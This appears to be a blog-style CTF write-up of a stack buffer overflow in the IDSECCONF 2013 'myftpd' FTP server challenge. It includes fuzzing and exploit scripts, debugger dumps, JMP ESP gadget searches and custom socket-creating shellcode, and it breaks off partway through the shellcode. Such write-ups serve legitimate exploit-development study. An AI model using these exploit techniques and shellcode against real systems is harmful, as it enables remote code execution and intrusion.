---
categories:
- Security
- Exploits
- CTF
comments: true
date: 2014-03-01T01:26:33Z
title: IDSECCONF 2013 myftpd challenge
---

With [OSCE][] out of the way and the family in need of a break from me doing study and certifications, I decided to turn my hand to some fun exploit challenges to keep up the practice. To a wannabe bug exploiter such as myself, there are plenty of options out there which are great for fun and practice. Some of those options are:

* Downloading an application with a known vulnerability and exploit and practising on that.
* Downloading a proof of concept crash from [ExploitDB][] and turning it into a full exploit.
* Reading sites such as [Corelan][] and [Fuzzy Security][], who both have great exploit tutorials. However, instead of reading through the walk-throughs, download the vulnerable applications and attempt to exploit them yourself.
* Getting some "exploitme" style challenges from some bygone [CTFs][CTF]. A great place to go is [ShellStorm][], which contains an archive of lots of these.

On this particular day I thought I'd try one of the harder exploitme challenges and it just so happened that something appeared in my Twitter feed that pointed me to [Ammar][]'s post discussing a level `500` exploit challenge from the [IDSECCONF 2013 CTF][idsecconf]. To quote Ammar:

> ... during the IDSECCONF offline CTF, none of the team were able to wrap
> up a working remote exploit, although one team were able to get [the]
> correct offset to overwrite EIP ...

This had the hallmarks of being tricky and fun! I asked Ammar if the binary was still available and he kindly made it available for download (head to his site if you would like to have a shot at it yourself).

What follows is my dissection of the binary, along with my approach to exploiting it so that it would allow the attacker to submit _any_ payload including reverse [Meterpreter][] shells, bind shells and VNC injection. If you're keen to take this challenge on by yourself, please don't read this as it's a blatant spoiler. Otherwise, let's get stuck in!

<!--more-->

## The Tools

For this exploit, I used:

* The [Immunity Debugger][]. I know I really need to get back into [Windbg][] now that OSCE is over, but cut me some slack.
* The [Mona.py][] plug-in written by the legendary [Corelanc0d3r][].
* The machine I did this on was a Windows XP SP3 machine. The target machine for the CTF was apparently XP SP2, hence my decision to use this instead of Windows 7.

If you want to follow along, get yourself these tools, configure them and have them ready to go.

## The FTP Server

The zip file that I downloaded contained one binary called `myftpd.exe` with a configuration file called `passwd.conf`. I started by opening the `passwd.conf` file to see what was inside:

```
test|test|c:|0
```

Obviously this is a list of users that are able to access the application and so it's probably safe to assume that a valid login is `test`/`test`. Upon launching the application we're presented with a rather nice black console which is used to show activity on the server:

![Running the myftpd.exe](/uploads/2014/03/ftp-server-running.png)

Nothing too crazy going on here. We can see that it handles the basic commands, but there's nothing too juicy going on. Given that we know this thing is supposed to be hosed remotely, let's get a basic fuzzing script together and see if we can break it. I decided to go with something custom and very rudimentary to begin with, and the reason for this was because it's a CTF exploitme, and I felt that the goal here was to get past a quirky exploit rather than spend a long period of time fuzzing. My guess paid off pretty quickly and it saved me from having to worry about more complicated fuzzing techniques and applications.

## Fuzzing the Server

We know that the first thing we need to do when signing in to the server is to issue the `USER` command, so for me this was the first logical point of call. I whipped up a quick python script which generated bigger and bigger user names to throw at the application. It looks like this:

```
#!/usr/bin/python

import socket

host = '10.1.10.34'
port = 21

def fuzz(payload):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  s.recv(2048)
  s.send(payload)
  s.shutdown
  s.close

print "[*] Fuzzing {0}:{1} ...".format(host, port)
for i in range(1, 100):
  name = "A" * (i * 0x10)
  command = "USER {0}\r\n".format(name)
  print "[*] Username {0} chars, Command {1} chars...".format(len(name), len(command))
  fuzz(command)
```

As you can see this script is really simple, and just increments the size of the payload to deploy until things break. I went ahead and attached Immunity to the server and kicked off my script. To my annoyance the developers of application has put a breakpoint in the code when a user connects. Obviously the goal here was to stop us from fuzzing under a debugger:

![Debug breakpoint while fuzzing](/uploads/2014/03/01-int3.png)

To get around this problem I just modified the assembly inline using Immunity so that the breakpoint (`CC`) instruction was instead a NOP (`90`) instruction like so:

![Changed to NOP](/uploads/2014/03/02-nop.png)

With this out of the way the script ran nicely. Until...

```
$ ./fuzz.py
[*] Fuzzing 10.1.10.34:21 ...
[*] Username 16 chars, Command 23 chars...
[*] Username 32 chars, Command 39 chars...
[*] Username 48 chars, Command 55 chars...
[*] Username 64 chars, Command 71 chars...
[*] Username 80 chars, Command 87 chars...
[*] Username 96 chars, Command 103 chars...
[*] Username 112 chars, Command 119 chars...
[*] Username 128 chars, Command 135 chars...
[*] Username 144 chars, Command 151 chars...
[*] Username 160 chars, Command 167 chars...
[*] Username 176 chars, Command 183 chars...
[*] Username 192 chars, Command 199 chars...
[*] Username 208 chars, Command 215 chars...
[*] Username 224 chars, Command 231 chars...
[*] Username 240 chars, Command 247 chars...
[*] Username 256 chars, Command 263 chars...
[*] Username 272 chars, Command 279 chars...
[*] Username 288 chars, Command 295 chars...
[*] Username 304 chars, Command 311 chars...
```

When the username hit `304` characters, things turned bad for the server. Immunity showed the following information about the registers:

```
EAX 00000000
ECX 0024A9C0
EDX 0000002F
EBX 41414141
ESP 00B5FFC0
EBP 41414141
ESI 41414141
EDI 41414141
EIP 41414141
```

At this point it looks like we have a "vanilla" `EIP` overwrite. Taking a look at the stack window we can see something interesting:

```
00B5FF90   00000000  ....
00B5FF94   00000000  ....
00B5FF98   00000000  ....
00B5FF9C   41414141  AAAA
00B5FFA0   41414141  AAAA
00B5FFA4   41414141  AAAA
00B5FFA8   41414141  AAAA
00B5FFAC   41414141  AAAA
00B5FFB0   41414141  AAAA
00B5FFB4   41414141  AAAA
00B5FFB8   41414141  AAAA
00B5FFBC   00000A00  ....
00B5FFC0   0024A760  `§$.                    <-- ESP points here
00B5FFC4   00249E10  ž$.
00B5FFC8   0022DCF8  øÜ".
00B5FFCC   7FFDE000  .àý
00B5FFD0   825C2600  .&\‚
00B5FFD4   00B5FFC0  Àÿµ.
00B5FFD8   823B54B8  ¸T;‚
00B5FFDC   FFFFFFFF  ÿÿÿÿ  End of SEH chain
00B5FFE0   7C839AC0  Àšƒ|  SE handler
00B5FFE4   7C80B720   ·€|  kernel32.7C80B720
00B5FFE8   00000000  ....
00B5FFEC   00000000  ....
00B5FFF0   00000000  ....
00B5FFF4   004013C0  À@.  myftpd.004013C0
00B5FFF8   0022DCF8  øÜ".
00B5FFFC   00000000  ....

 -- this is the end of the memory region --
```

From the above dump we can see that there's a chance we can redirect the flow of code to something we control by pointing `EIP` to a known instruction for either a `PUSH ESP # RET`, `CALL ESP` or `JMP ESP` instruction. Before we look into that, it's worth noting that this memory dump ends at `00B5FFFC`, which means that we probably can't write too much information otherwise we'll crash the process in a different way. The other thing that stands out here is that the first part of the payload has be set to zero (we can't see `USER` anywhere here) so it would appear that the front part of the buffer is clobbered by something before we get here.

I changed my fuzzing script a little and did some trial and error. It turns out that the use of `USER` isn't actually required to cause the crash. I also found that the payload size could only be up to `365` characters, as any more would result in an exception.

I fired a command which was simply a string of `365` `A` characters without a `\r\n` suffix. This is what the stack looked like:

```
00B5FF90   00000000  ....
00B5FF94   00000000  ....
00B5FF98   00000000  ....
00B5FF9C   41414141  AAAA
00B5FFA0   41414141  AAAA
00B5FFA4   41414141  AAAA
00B5FFA8   41414141  AAAA
00B5FFAC   41414141  AAAA
00B5FFB0   41414141  AAAA
00B5FFB4   41414141  AAAA
00B5FFB8   41414141  AAAA
00B5FFBC   41414141  AAAA
00B5FFC0   41414141  AAAA
00B5FFC4   41414141  AAAA
00B5FFC8   41414141  AAAA
00B5FFCC   41414141  AAAA
00B5FFD0   41414141  AAAA
00B5FFD4   41414141  AAAA
00B5FFD8   41414141  AAAA
00B5FFDC   41414141  AAAA  Pointer to next SEH record
00B5FFE0   41414141  AAAA  SE handler
00B5FFE4   41414141  AAAA
00B5FFE8   41414141  AAAA
00B5FFEC   41414141  AAAA
00B5FFF0   41414141  AAAA
00B5FFF4   41414141  AAAA
00B5FFF8   41414141  AAAA
00B5FFFC   00414141  AAA.
```

What's interesting here is that a `NULL` byte is being written to memory at `00B5FFFF`, just something to bear in mind later on.

## Controlling EIP

The next thing to do is to start crafting an exploit, and in order to execute our own code we need to control `EIP`. First we need to know the offset of the bytes that overwrite `EIP` and for this we'll use the tried and true `pattern_create.rb` along with its cohort `pattern_offset.rb`. However, I'm not a fan of having massive exploit payloads directly pasted into my source code, so instead I read the files in. We create the pattern file like so:

```
$ pattern_create.rb 356 > pattern.txt
```

We then begin our exploit with a simple shell that looks like this:

```
#!/usr/bin/python

import socket

host = '10.1.10.34'
port = 21

def read_file(path):
  with open(path, 'r') as f:
    return f.read()

def pwn(payload):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  s.recv(2048)
  s.send(payload)
  s.shutdown
  s.close

print "[*] Attacking {0}:{1} ...".format(host, port)
command = read_file('pattern.txt')
print "[*] Command {0} chars...".format(len(command))
pwn(command)
```

If we launch this script, the program crashes with the following register content:

```
EAX 00000000
ECX 0024CF98
EDX 00000031
EBX 336A4132
ESP 00B5FFC0 ASCII "0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al"
EBP 376A4136
ESI 41346A41
EDI 6A41356A
EIP 41386A41
```

For now we're only interested in the offset of `EIP` and `ESP`, and the point at which the `NULL` bytes stop being written; if we need others then we will figure them out later:

```
$ pattern_offset.rb 0Ak1    
[*] Exact match at offset 302
$ pattern_offset.rb 41386A41
[*] Exact match at offset 294
$ pattern_offset.rb 8Ai9
[*] Exact match at offset 266
```

Here we can see that EIP and ESP are actually quite close together. Let's modify our exploit to see if we have our offsets correct (we'll worry about the shellcode start later). The script now looks like this:

```
#!/usr/bin/python

import socket

host = '10.1.10.34'
port = 21

def read_file(path):
  with open(path, 'r') as f:
    return f.read()

def pwn(payload):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  s.recv(2048)
  s.send(payload)
  s.shutdown
  s.close

max_size = 365
offsets = {
  'SC': 266,
  'EIP': 294,
  'ESP': 302,
}

print "[*] Attacking {0}:{1} ...".format(host, port)

command  = ""
command += "A" * (offsets['EIP'] - len(command))
command += "BBBB"
command += "C" * (offsets['ESP'] - len(command))
command += "DDDD"
command += "E" * (max_size - len(command))

print "[*] Command {0} chars...".format(len(command))
pwn(command)
```

Running this command gives us the following register content when crashed:

```
EAX 00000000
ECX 0024CF98
EDX 00000031
EBX 41414141
ESP 00B5FFC0 ASCII "DDDDEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE"
EBP 41414141
ESI 41414141
EDI 41414141
EIP 42424242
```

Our offsets are spot on. Next we need to find an address that we can use to overwrite ESP with. Preferably we'll use a `JMP ESP` instruction instead of the other options because this will not modify the content of memory around `ESP` (which would be bad in case it overwrites stuff that's important to us). Here we'll use **Mona.py** within immunity to give us a list of addresses that we can use.

Ideally our exploit would not be tied to a given platform, so we would ultimately like to find an address which isn't tied to any Windows DLLs. We start by searching for jump instructions within the `myftpd` process itself because we know this will translate across platforms:

```
!mona jmp -r ESP -m myftpd
```

Unfortunately for us, all we get is:

```
           ---------- Mona command started on 2014-02-28 22:29:14 (v2.0, rev 427) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D       - Only querying modules myftpd
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 1 modules
0BADF00D       - Querying module myftpd.exe
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile jmp.txt
0BADF00D       Found a total of 0 pointers
0BADF00D
           [+] This mona.py action took 0:00:00.265000
```

There are no addresses in the executable which we can use to redirect control to `ESP`. So we have to look further. We instead let Monay go nuts on all the modules:

```
!mona jmp -r ESP
```

And we get a listing that looks like the following:

```
           ---------- Mona command started on 2014-02-28 22:27:28 (v2.0, rev 427) ----------
0BADF00D   [+] Processing arguments and criteria
0BADF00D       - Pointer access level : X
0BADF00D   [+] Generating module info table, hang on...
0BADF00D       - Processing modules
0BADF00D       - Done. Let's rock 'n roll.
0BADF00D   [+] Querying 13 modules
0BADF00D       - Querying module WS2_32.DLL
71A90000   Modules C:\WINDOWS\System32\wshtcpip.dll
0BADF00D       - Querying module mswsock.dll
0BADF00D       - Querying module myftpd.exe
0BADF00D       - Querying module GDI32.dll
0BADF00D       - Querying module ADVAPI32.dll
0BADF00D       - Querying module kernel32.dll
0BADF00D       - Querying module msvcrt.dll
0BADF00D       - Querying module Secur32.dll
0BADF00D       - Querying module ntdll.dll
0BADF00D       - Querying module WS2HELP.dll
0BADF00D       - Querying module RPCRT4.dll
0BADF00D       - Querying module hnetcfg.dll
0BADF00D       - Querying module USER32.dll
0BADF00D       - Search complete, processing results
0BADF00D   [+] Preparing output file 'jmp.txt'
0BADF00D       - (Re)setting logfile jmp.txt
0BADF00D   [+] Writing results to jmp.txt
0BADF00D       - Number of pointers of type 'jmp esp' : 14
0BADF00D       - Number of pointers of type 'call esp' : 10
0BADF00D       - Number of pointers of type 'push esp # ret ' : 9
0BADF00D   [+] Results :
77F31D2F     0x77f31d2f : jmp esp |  {PAGE_EXECUTE_READ} [GDI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\GDI32.dll)
77DEF049     0x77def049 : jmp esp |  {PAGE_EXECUTE_READ} [ADVAPI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ADVAPI32.dll)
77DF965B     0x77df965b : jmp esp |  {PAGE_EXECUTE_READ} [ADVAPI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ADVAPI32.dll)
77E18063     0x77e18063 : jmp esp |  {PAGE_EXECUTE_READ} [ADVAPI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ADVAPI32.dll)
77E23B63     0x77e23b63 : jmp esp |  {PAGE_EXECUTE_READ} [ADVAPI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ADVAPI32.dll)
77E42A9F     0x77e42a9f : jmp esp |  {PAGE_EXECUTE_READ} [ADVAPI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ADVAPI32.dll)
7C86467B     0x7c86467b : jmp esp |  {PAGE_EXECUTE_READ} [kernel32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\kernel32.dll)
77E8560A     0x77e8560a : jmp esp |  {PAGE_EXECUTE_READ} [RPCRT4.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\RPCRT4.dll)
77E9025B     0x77e9025b : jmp esp |  {PAGE_EXECUTE_READ} [RPCRT4.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\RPCRT4.dll)
662EB24F     0x662eb24f : jmp esp |  {PAGE_EXECUTE_READ} [hnetcfg.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\hnetcfg.dll)
7E429353     0x7e429353 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
7E4456F7     0x7e4456f7 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
7E455AF7     0x7e455af7 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
7E45B310     0x7e45b310 : jmp esp |  {PAGE_EXECUTE_READ} [USER32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\USER32.dll)
71ABF8FB     0x71abf8fb : call esp |  {PAGE_EXECUTE_READ} [WS2_32.DLL] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\WS2_32.DLL)
71A78D3F     0x71a78d3f : call esp |  {PAGE_EXECUTE_READ} [mswsock.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\mswsock.dll)
77DEEFFC     0x77deeffc : call esp |  {PAGE_EXECUTE_READ} [ADVAPI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ADVAPI32.dll)
77DEF0B2     0x77def0b2 : call esp |  {PAGE_EXECUTE_READ} [ADVAPI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ADVAPI32.dll)
77E18153     0x77e18153 : call esp |  {PAGE_EXECUTE_READ} [ADVAPI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ADVAPI32.dll)
77E1C23B     0x77e1c23b : call esp |  {PAGE_EXECUTE_READ} [ADVAPI32.dll] ASLR: False, Rebase: False, SafeSEH: True, OS: True, v5.1.2600.5512 (C:\WINDOWS\system32\ADVAPI32.dll)
0BADF00D   ... Please wait while I'm processing all remaining results and writing everything to file...
0BADF00D   [+] Done. Only the first 20 pointers are shown here. For more pointers, open jmp.txt...
0BADF00D       Found a total of 33 pointers
0BADF00D
           [+] This mona.py action took 0:00:01.281000
```

Isn't that just sweet? Lots of options here, though it does tie us down to a particular platform and using addresses like these will not work on Vista and later thanks to ASLR. Perhaps we can come up with a solution to this down the track.

I dug a little deeper in `jmp.txt` which contained all the addresses, and decided to settle on `0x7e4456f7` (a `JMP ESP` instruction) which is located in `user32.dll`. I chose this one because the only byte that isn't in the `ASCII` table is the last one, and it was my attempt and minimising the possibility of a bad character causing problems. I modified the exploit so that `EIP` would contain this value, and changed the code in `ESP` so that it would break once the jump had been performed. I also starting building in the support for multiple platforms for easy adjustment later on.

```
#!/usr/bin/python

import socket, struct

host = '10.1.10.34'
port = 21

def read_file(path):
  with open(path, 'r') as f:
    return f.read()

def pwn(payload):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  s.recv(2048)
  s.send(payload)
  s.shutdown
  s.close

max_size = 365

offsets = {
  'SC': 266,
  'EIP': 294,
  'ESP': 302,
}

# the start of our collection of supported platforms
targets = [
  { 'Name': 'Windows XP SP3', 'JMPESP': 0x7e4456f7 }
]

# Hard coded target for now
target = targets[0]

print "[*] Attacking {0}:{1} ...".format(host, port)

command  = ""
command += "A" * (offsets['EIP'] - len(command))
command += struct.pack("<L", target['JMPESP'])
command += "C" * (offsets['ESP'] - len(command))
command += "\xCC\xCC\xCC\xCC"
command += "E" * (max_size - len(command))

print "[*] Command {0} chars...".format(len(command))
pwn(command)
```

Execution of this script gives us the following:

![EIP control](/uploads/2014/03/03-eip-control.png)

"Wonderful", as [muts][] would say. We can see that `ESP` contains the breakpoint instructions and the first of those instructions has been hit, which indicates that our `EIP` overwrite worked and we now have control.

## Getting a shell

If it isn't already clear, we don't really have that much space to play in. Our shellcode space starts at `266`, ends at `365` and has a 4-byte block taken out of the middle of it which contains the `EIP` overwrite and another 4 bytes tucked away between `ESP` and `EIP`. It doesn't leave us with much given how things are broken up. The area we have for shellcode looks like this:

```
00B5FF94   00000000  ....
00B5FF98   00000000  ....
00B5FF9C   42424242  BBBB  <-- block 2 start --
00B5FFA0   42424242  BBBB
00B5FFA4   42424242  BBBB
00B5FFA8   42424242  BBBB
00B5FFAC   42424242  BBBB
00B5FFB0   42424242  BBBB
00B5FFB4   42424242  BBBB  --  block 2 end -->
00B5FFB8   7E4456F7  ÷VD~  USER32.7E4456F7
00B5FFBC   43434343  CCCC  <-- tucked away bytes -->
00B5FFC0   CCCCCCCC  ÌÌÌÌ  <-- block 1 start (entry point) --
00B5FFC4   45454545  EEEE
00B5FFC8   45454545  EEEE
00B5FFCC   45454545  EEEE
00B5FFD0   45454545  EEEE
00B5FFD4   45454545  EEEE
00B5FFD8   45454545  EEEE
00B5FFDC   45454545  EEEE  Pointer to next SEH record
00B5FFE0   45454545  EEEE  SE handler
00B5FFE4   45454545  EEEE
00B5FFE8   45454545  EEEE
00B5FFEC   45454545  EEEE
00B5FFF0   45454545  EEEE
00B5FFF4   45454545  EEEE
00B5FFF8   45454545  EEEE
00B5FFFC   00454545  EEE.   -- block 1 end -->
```

Clearly we can't fit a standard useful payload in here, plus with such limitations it flies in the face of our goal of being able to invoke _any_ payload we wish from the attacker's side. We need to consider other options.

### Egghunter?

Now the first thing that people tend to do in situations like this is try to jam an egghunter of some description into this small area and use that to find a payload that was uploaded earlier on. This was the next step that I took, however I wasn't able to get it working for two reasons:

1. I couldn't find a way of persisting the egg into memory prior to executing this payload.
1. There are a number of bad characters which make it hard to fit the encoded egghunter into this area of memory.

Also, as handy as the egghunter approach is, it always feels like cheating. Plus if we want to support other platforms, such as WOW64, we'd have to have a much bigger cross-platform egghunter which would never fit.

At this point I decided not to go with the egghunter approach and attempt to find something else.

### Socket reuse?

The FTP server already has a socket open to the attacker, the only reason we can't execute our own payloads is because the FTP server doesn't give us space and isn't happy with certain characters. If we were to control the call to `recv` we could avoid both of these issues. This was the approach that I thought I would consider diving into.

Unfortunately for us, there is one killer issue that voids this option. That is, our shellcode does not actually execute until _after_ the server closes the socket. If the socket gets destroyed prior to our code being run then it becomes useless to us. With this in mind, I considered finding the listen socket in memory and getting the shellcode to call `accept` on the same socket. However, this approach becomes a race between the main thread and the consumer thread. Relying on such conditions results in exploits that are unreliable, and nobody likes a dodgy sploit. They're as unwelcome as an I.T. recruiter at a hacker meetup.

Given that both of those approaches were off the cards, reusing sockets was something that I had to let go of.

### Socket construction!

I spent a bit of time thinking and nosing around the binary to see how it behaved with a goal of seeing which things I could leverage to get a foothold. I decided to take a slightly different approach which would require me to get funky with custom shellcode (and who doesn't love that kind of challenge!). My thought process leading up to this point went like this:

* The server initialises a socket to listen on. To do so, it needs to call `socket`, `bind`, `listen` and `accept`, which means all of these functions are imported and should be readily available for use.
* The context of the main thread would still exist when our own thread is running which means that the `sockaddr` information used would still be in memory. It turns out that this value is actually stored in a global variable located at `0x00407434` and hence we can easily get to it and tweak it to fit our needs. This would mean we could use this information rather that try to set it up ourselves.
* We could listen on a new socket for our attacker to connect, and when it does, it reads a payload into memory using `recv` and executes it immediately.

Sounds a little barmy, but a lot of fun. So with this in mind, I started to dive into the shellcode.

## Shellcode golf

### Things to note

Before we can dive into building our shellcode we have a few things we need to consider. First, we want our code to be as portable as possible, and hence rely on the `myftpd.exe` binary instead of other DLLs. This means that when we call functions such as `socket` we need to go via the import table instead of accessing the DLLs directly. The problem we have here is that those addresses all come in the form `0x0040ABCD`, which means we have a `NULL` byte to deal with. This is pretty easy to get around in a single case using the following method:

1. Start by setting `EAX` to `0x40ABCD44`, which is the same as the address, shifted left by 8 bits, and the OR'd with any valid character (`44` in this case).
1. Shift `EAX` right using the `SHR` instruction. This removes the lower order byte and zeros out the higher order byte. The effect is that you end up with `EAX` containing the value `0x0040ABCD` just as we require.

Unfortunately, this approach means that we would have to use up 10 bytes for every call we make. This is because the `MOV` takes up 5 bytes, `SHR` 3 bytes, and `CALL` another 2 bytes. This is expensive! Instead we need to get smarter to reduce amount of work done.

We can actually use a handy trick to solve this problem. Observe the locations of the interesting functions within the `myftpd.exe` binary:

```
0040340C   JMP DWORD PTR DS:[<&WS2_32.recv>]        ;  WS2_32.recv
00403424   JMP DWORD PTR DS:[<&WS2_32.accept>]      ;  WS2_32.accept
00403434   JMP DWORD PTR DS:[<&WS2_32.socket>]      ;  WS2_32.socket
00403454   JMP DWORD PTR DS:[<&WS2_32.bind>]        ;  WS2_32.bind
0040345C   JMP DWORD PTR DS:[<&WS2_32.listen>]      ;  WS2_32.listen
00403DD4   JMP DWORD PTR DS:[<&msvcrt.malloc>]      ;  msvcrt.malloc
00403EA4   JMP DWORD PTR DS:[<&KERNEL32.VirtualProt>;  kernel32.VirtualProtect
```

We can see that these imports are close together. So we could perform the above calculation the first time we need to call a function, but from that point on we can just modify the lower-order bytes directly. The `MOV ?L` and `MOV ?H` instructions are just 2 bytes, and `MOV ?X` is 3 bytes and hence save 5 or 6 bytes per call. Excellent! We just need to pick a register that will not change across function calls, and that will allow us to operate on the two lower order bytes easy. I chose `EBX` for this purpose.

So with that lot in mind, let's get shellcoding.

### Building the exploit shellcode

At the time of the crash our registers don't contain anything too useful, other than `EAX` containing a `0` and `ESP` pointing to a known location in memory. However, even this is in a bad spot for us because any adjustment of the stack via the use of `PUSH` or `CALL` instructions result in the stack memory being changed. As a result we need to move `ESP` away from our shellcode prior to any work being done. Therefore our first bit of shellcode looks like this:

```
SUB ESP, 0x7C         ; Move the stack pointer somewhere safe
```

We subtract `0x7C` bytes because:

1. Anything more than `0x7F` results in an instruction that is 6 bytes. Also, each byte needs to be a non-bad char, which means that `ESP` would be adjusted too far away, resulting in other problems.
1. The largest stack-aligned value under `0x7F` is `0x7C`, and keeping the stack aligned for certain function calls is very important.

The stack now points to somewhere in the block of zeros that overwrote our original payload. This will prove to be handy later on when we need zeros pushed onto the stack.


Next we need to construct a call to a new socket. This means we need to locate and call `socket` with the right parameters. To create a socket that is able to work with streams over TCP, the call would need to look like this: `socket(2, 1, 6);`

Before we can do that we need to get the first of the functions that we're going to call into `EBX`, just as we discussed before:

```
MOV EBX, 0x40343444   ; Set EBX to a mostly correct address
SHR EBX, 0x8          ; Shift EBX right by a byte to correct the address
```

We now need to push the three magic values onto the stack in the reverse order (bear in mind that `EAX` is `0` at this point):

```
MOV AL, 6             ; Set EAX to 6
PUSH EAX
MOV AL, 1             ; Set EAX to 1
PUSH EAX
INC EAX               ; Set EAX to 2
PUSH EAX
```

With the stack parameters ready to go, we can simply call the socket function and we should see a result appear in `EAX` which indicates a valid socket handle. Let's take a look at our exploit up until this point:

```
#!/usr/bin/python

import socket, struct

host = '10.1.10.34'
port = 21

def read_file(path):
  with open(path, 'r') as f:
    return f.read()

def pwn(payload):
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
  s.connect((host, port))
  s.recv(2048)
  s.send(payload)
  s.shutdown
  s.close

max_size = 365

offsets = {
  'SC': 266,
  'EIP': 294,
  'ESP': 302,
}

# the start of our collection of supported platforms
targets = [
  { 'Name': 'Windows XP SP3', 'JMPESP': 0x7e4456f7 }
]

# Hard coded target for now
target = targets[0]

print "[*] Attacking {0}:{1} ...".format(host, port)

block1  = ""
# Adjust the stack to prevent it from breaking things in our shellcode
block1 += "\x83\xEC\x7C"                       # SUB ESP, 0x7C
# Get the address of `socket` into EBX
block1 += "\xBB\x44\x34\x34\x40"               # MOV EBX,<offsetted address>
block1 += "\xC1\xEB\x08"                       # SHR EBX, 0x8
# set up the stack for the call to `socket`
block1 += "\xB0\x06"                           # MOV AL, 0x6
block1 += "\x50"                               # PUSH EAX
block1 += "\xB0\x01"                           # MOV AL, 0x1
block1 += "\x50"                               # PUSH EAX
block1 += "\x40"                               # INC EAX
block1 += "\x50"                               # PUSH EAX
# invoke the call to `socket`
block1 += "\xFF\xD3"                           # CALL EBX
# set a breakpoint so we can see what's going on
block1 += "\xCC"

command  = ""
command += "Z" * (offsets['SC'] - len(command))
command += "B" * (offsets['EIP'] - len(command))
command += struct.pack("<L", target['JMPESP'])
command += "C" * (offsets['ESP'] - len(command))
command += block1
command += "E" * (max_size - len(command))

print "[*] Command {0} chars...".format(len(command))
pwn(command)

```

Invocation shows shellcode that has just been invoked looking like this:

```
00B5FFC0   83EC 7C          SUB ESP,7C
00B5FFC3   BB 44343440      MOV EBX,40343444
00B5FFC8   C1EB 08          SHR EBX,8
00B5FFCB   B0 06            MOV AL,6
00B5FFCD   50               PUSH EAX
00B5FFCE   B0 01            MOV AL,1
00B5FFD0   50               PUSH EAX
00B5FFD1   40               INC EAX
00B5FFD2   50               PUSH EAX
00B5FFD3   FFD3             CALL EBX
```

The registers contain the following:

```
EAX 00000084
ECX 71AB4114 WS2_32.71AB4114
EDX 00000008
EBX 00403434 <JMP.&WS2_32.socket>
ESP 00B5FF44
EBP 42424242
ESI 42424242
EDI 42424242
EIP 00B5FFD6
O 0  LastErr ERROR_SUCCESS (00000000)
```

So we can see that `EBX` contains the `socket` function address as we had planned, but more importantly the `LastErr` indicates success, and `EAX` contains the result of the function call which is the handle to the socket we'll be listening on. We need to store that handle away so that we can use it in calls to `bind`, `listen` and `accept`. Instead of pushing onto the stack we're going to put it in a register for easy access. `EDI` is another register that tends to persist across calls to the functions that we'll be calling so let's put it in there.

```
MOV EDI, EAX          ; Store the socket handle somewhere else
```

Once we've got the socket, we need to bind it to an address. This is where the existing global variable comes in which was used to set up the existing socket. To locate this structure in memory, all I had to do was use Immunity to locate the exiting call to `bind`. This was as simple as setting a breakpoint on the same memory address as the `bind` jump call, which is at `0x00403454`. This is invoked during start-up, and so launching the application results in the breakpoint being hit. From there we can step through a few instructions until we find ourselves back at the call site, located at address `0x00403134`. The instructions leading up to the call look like this:

```
00403116   . 52             PUSH EDX                                 ; |Socket
00403117   . A3 38744000    MOV DWORD PTR DS:[407438],EAX            ; |
0040311C   . C74424 08 1000>MOV DWORD PTR SS:[ESP+8],10              ; |
00403124   . C74424 04 3474>MOV DWORD PTR SS:[ESP+4],myftpd.00407434 ; |
0040312C   . A1 30744000    MOV EAX,DWORD PTR DS:[407430]            ; |
00403131   . 890424         MOV DWORD PTR SS:[ESP],EAX               ; |
00403134   . E8 1B030000    CALL <JMP.&WS2_32.bind>                  ; \bind
```

